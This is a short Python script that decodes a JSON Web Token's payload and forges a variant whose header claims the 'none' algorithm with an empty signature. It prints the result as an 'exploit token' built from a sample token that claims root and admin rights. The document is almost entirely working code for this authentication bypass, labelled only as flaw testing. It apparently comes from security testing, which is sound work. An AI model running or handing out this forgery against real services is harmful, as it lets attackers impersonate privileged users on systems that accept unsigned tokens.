import base64
import json
import hmac
import hashlib

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return "Invalid token format."
        
        # Decode and parse payload (2nd part)
        payload_b64 = parts[1]
        # Fix padding if missing
        payload_b64 += '=' * (4 - len(payload_b64) % 4)
        payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
        return json.loads(payload_json)
    except Exception as e:
        return f"Error decoding: {str(e)}"

def check_none_algorithm_flaw(token):
    parts = token.split('.')
    # Alter header to use "none" alg
    fake_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().strip("=")
    fake_token = f"{fake_header}.{parts[1]}."
    return fake_token

# Example Test Execution
if __name__ == "__main__":
    # Simulated JWT token
    sample_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCIsImFkbWluIjp0cnVlfQ.Sg_signature"
    print("[*] Parsed Payload Data:")
    print(json.dumps(decode_jwt_payload(sample_jwt), indent=4))
    
    print("\n[*] Generating Exploit Token (None-Algorithm Flaw Testing):")
    print(check_none_algorithm_flaw(sample_jwt))
